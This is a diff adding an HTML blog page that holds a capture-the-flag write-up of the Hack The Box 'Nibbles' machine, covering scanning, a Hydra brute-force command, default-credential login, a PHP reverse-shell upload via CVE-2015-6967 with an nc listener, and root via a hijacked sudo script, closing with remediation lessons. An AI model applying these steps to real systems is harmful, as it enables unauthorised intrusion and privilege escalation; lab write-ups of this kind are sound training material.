@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="Sulejman Bijedic">
+    <meta name="description" content="Write-ups about Linux and Security">
+    <meta name="keywords" content="blog,security,linux">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Nibbles"/>
+<meta name="twitter:description" content="Machine info  OS : Linux Difficulty : Easy Points : 20 IP : 10.10.10.75  Mind Map Reconnaisance I start with a scan to check for open ports:
+sudo nmap -sT -sV -n 10.10.10.75 -oA nmap/sT_SV_scan Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-20 10:32 BST Nmap scan report for 10.10.10.75 Host is up (0.097s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7."/>
+
+    <meta property="og:title" content="Nibbles" />
+<meta property="og:description" content="Machine info  OS : Linux Difficulty : Easy Points : 20 IP : 10.10.10.75  Mind Map Reconnaisance I start with a scan to check for open ports:
+sudo nmap -sT -sV -n 10.10.10.75 -oA nmap/sT_SV_scan Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-20 10:32 BST Nmap scan report for 10.10.10.75 Host is up (0.097s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/hackthebox/nibbles/" />
+<meta property="article:published_time" content="2020-06-19T16:04:02+01:00" />
+<meta property="article:modified_time" content="2020-06-19T16:04:02+01:00" />
+
+
+    
+      <base href="/posts/hackthebox/nibbles/">
+    
+    <title>
+  Nibbles · lafx0
+</title>
+
+    
+      <link rel="canonical" href="/posts/hackthebox/nibbles/">
+    
+
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.11.2/css/all.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.a4f332213a21ce8eb521670c614470c58923aaaf385e2a73982c31dd7642decb.css" integrity="sha256-pPMyITohzo61IWcMYURwxYkjqq84XipzmCwx3XZC3ss=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+      <link rel="stylesheet" href="/css/custom.css" />
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+    <meta name="generator" content="Hugo 0.66.0" />
+  </head>
+
+  
+  
+  <body class="colorscheme-light">
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      lafx0
+    </a>
+    
+    <input type="checkbox" id="menu-toggle" />
+    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
+    <ul class="navigation-list">
+      
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/posts/">Blog</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/about/info/">About</a>
+          </li>
+        
+      
+      
+    </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Nibbles</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fas fa-calendar"></i>
+              <time datetime='2020-06-19T16:04:02&#43;01:00'>
+                June 19, 2020
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fas fa-clock"></i>
+              5-minute read
+            </span>
+          </div>
+          
+          
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="machine-info">Machine info</h1>
+<ul>
+<li>OS : Linux</li>
+<li>Difficulty : Easy</li>
+<li>Points : 20</li>
+<li>IP : 10.10.10.75</li>
+</ul>
+<h1 id="mind-map">Mind Map</h1>
+<p><img src="/images/htb/nibbles_mindmap.png" alt="Nibbles_MindMap"></p>
+<h1 id="reconnaisance">Reconnaisance</h1>
+<p>I start with a scan to check for open ports:</p>
+<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">sudo nmap -sT -sV -n 10.10.10.75 -oA nmap/sT_SV_scan
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-20 10:32 BST
+Nmap scan report for 10.10.10.75
+Host is up (0.097s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</code></pre></div>
+<strong>Note</strong>: A full port scan does not reveal any new open port.</p>
+<p>I have only port 22 and port 80 open, so let&rsquo;s start with the enumeration phase.</p>
+<h1 id="enumeration">Enumeration</h1>
+<p>I proceed visiting the webpage at <code>10.10.10.75:80</code>. It shows nothing apart from a &ldquo;Hello World&rdquo; message, but visiting the source code I can see a reference to a resource:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&lt;b&gt;Hello world!&lt;/b&gt;
+
+
+&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;</code></pre></div>
+<p>Visiting <code>10.10.10.75:80/nibbleblog/</code> I am presented with a <strong>Nibbleblog</strong> blog homepage:</p>
+<p><img src="/images/htb/nibbles_blog.png" alt="Nibbles_Blog"></p>
+<p>At this point - as the links in the page do not show anything useful - I want to check if there are open directories available on the web server. I mostly like <code>dirsearch</code> for this purpose:</p>
+<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">sudo python3 /opt/dirsearch/dirsearch.py -u http://10.10.10.75:80/nibbleblog/ -e php,bak,old,sh</code></pre></div>
+Where:</p>
+<ul>
+<li><code>-e</code> is for telling the command what extensions to search for</li>
+</ul>
+<p>I&rsquo;m able to found something interesting here: a <code>README</code> page and a a link to an <code>Admin login</code> page.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">[11:19:28] 200 -    1KB - /nibbleblog/admin.php
+[11:19:29] 200 -    2KB - /nibbleblog/admin/
+[11:19:29] 403 -  312B  - /nibbleblog/admin/.htaccess
+[11:19:29] 200 -    2KB - /nibbleblog/admin/?/login
+[11:19:30] 301 -  332B  - /nibbleblog/admin/js/tinymce  -&gt;  http://10.10.10.75/nibbleblog/admin/js/tinymce/
+[11:19:30] 200 -    2KB - /nibbleblog/admin/js/tinymce/
+[11:19:52] 301 -  323B  - /nibbleblog/content  -&gt;  http://10.10.10.75/nibbleblog/content/                         
+[11:20:04] 200 -    3KB - /nibbleblog/index.php                                                                
+[11:20:04] 200 -    3KB - /nibbleblog/index.php/login/
+[11:20:05] 200 -   78B  - /nibbleblog/install.php
+[11:20:21] 200 -    5KB - /nibbleblog/README</code></pre></div>
+<p>The <code>README</code> file informs about the <strong>Nibbleblog</strong> version. It can be useful for searching for any known vulnerability.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">====== Nibbleblog ======
+Version: v4.0.3
+Codename: Coffee
+Release date: 2014-04-01</code></pre></div>
+<p>Indeed, version  4.0.3 seems vulnerable to <code>CVE-2015-6967</code>:</p>
+<blockquote>
+<p>Unrestricted file upload vulnerability in the My Image plugin in Nibbleblog before 4.0.5 allows remote administrators to execute arbitrary code by uploading a file with an executable extension, then accessing it via a direct request to the file in content/private/plugins/my_image/image.php.</p>
+</blockquote>
+<h1 id="exploitation">Exploitation</h1>
+<p>I first need to figure out how to enter the administrator panel for uploading a file.
+Here is the Admin login page:</p>
+<p><img src="/images/htb/nibbles_login.png" alt="Nibbles_Login"></p>
+<p>Let&rsquo;s try to brute force the login with <strong>Hydra</strong>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">hydra -V -f -t 4 -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.75 http-post-form &#34;/nibbleblog/admin.php:username=^USER^<span style="color:#960050;background-color:#1e0010">&amp;</span>password=^PASS^<span style="color:#960050;background-color:#1e0010">&amp;</span>Login=Login:Incorrect username or password.&#34;</code></pre></div>
+<p>Where:</p>
+<ul>
+<li><code>-V</code> is for verbosity</li>
+<li><code>-f</code> exits when a successful login is found</li>
+<li><code>-t</code> number of connects in parallel per target</li>
+<li><code>username</code> and <code>password</code> are the fields to bruteforce</li>
+<li><code>Incorrect username or password</code> is the message printed on screen when the login fails</li>
+</ul>
+<p>I get some false positives and the attempt to bruteforce the login blocks my ip :(
+I have to wait a few minutes for being able to visit the login page again! The solution here appears to be really simple, I just have to try some basic user/pass combinations like <code>admin/admin</code>, <code>admin/password</code>, <code>admin/nibbles</code>. The last one works!</p>
+<p>Once I&rsquo;m in, I have to upload a file of my choice under <code>Plugins -&gt; My image</code>. I download a <code>php-reverse-shell</code> from Pentestmonkey and edit it with the IP/PORT couple of my machine before uploading the file.</p>
+<p>Then I have to set up a netcat listener to receive the connection back and visit the following link (which hosts the reverse shell):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php</code></pre></div>
+<p>I receive a connection back and I&rsquo;m logged in as the <code>nibbler</code> user!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">nc -lnvp 4445
+listening on [any] 4445 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.10.10.75] 59652
+Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 11:37:54 up  6:14,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ id
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)</code></pre></div>
+<h1 id="privilege-escalation">Privilege escalation</h1>
+<p>To have a Python interactive shell:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">$ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+nibbler@Nibbles:/home/nibbler$</code></pre></div>
+<p>For privilege escalation I like using this great tool called <strong>Linux Smart Enumeration</strong>. You can find it on GitHub: <a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p>
+<p>I download the script on the target machine and launch it with the following command:</p>
+<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">./lse.sh -l 1 -i</code></pre></div>
+Where:</p>
+<ul>
+<li><code>-l</code> specifies the &lsquo;verbosity&rsquo; of the command</li>
+<li><code>-i</code> is for telling the command to not ask the current user password</li>
+</ul>
+<p>Then I check the scritp results for interesting informations about the machine:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">[!] sud010 Can we list sudo commands without a password?................... yes!
+---
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh</code></pre></div>
+<p>I&rsquo;m able to run the <code>/home/nibbler/personal/stuff/monitor.sh</code> script with sudo permissions without providing a password!
+The content of the <code>personal</code> directory is zipped. I have two options here:</p>
+<ol>
+<li>unzip the file and edit <code>monitor.sh</code></li>
+<li>as I have write permissions under <code>/home/nibbler</code>, I can create my own <code>monitor.sh</code> script under the specified path</li>
+</ol>
+<p>I choose the second one! All I have to do is to create a script named <code>monitor.sh</code> with the following content:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">#!bin/sh
+
+bash</code></pre></div>
+<p>And make it executable:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod +x monitor.sh</code></pre></div>
+<p>Launching the script with sudo gives me root permissions!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
+sudo ./monitor.sh
+sudo: unable to resolve host Nibbles: Connection timed out
+/home/nibbler/personal/stuff/monitor.sh: 1: /home/nibbler/personal/stuff/monitor.sh: !#bin/sh: not found
+root@Nibbles:/home/nibbler/personal/stuff# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@Nibbles:/home/nibbler/personal/stuff#</code></pre></div>
+<p><strong>Note</strong>: as always, flags are under <code>/home</code> and <code>/root</code>, but I suppose we don&rsquo;t really care about that!</p>
+<h2 id="lessons-learned-and-remediations">Lessons learned and remediations</h2>
+<ul>
+<li>Always try first simple user/passwords combinations before attempting to brute force a login, so to avoid ending up in a blacklist.</li>
+<li>The admin panel credentials were too easy to guess, so never use weak authentication credentials.</li>
+<li>The blog is using a known vulnerable application, so always patch your software where possible.</li>
+<li>The system admin should have not given a regular user the ability to run a script as root!</li>
+</ul>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script>
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [
+          ['$', '$'], ['\\(', '\\)']
+        ],
+        processEscapes: true,
+        processEnvironments: true
+      },
+      options: {
+        skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
+      }
+    };
+  </script>
+  </section>
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    
+      <p>'  '</p>
+    
+    
+    
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+
+    
+
+  </body>
+
+</html>
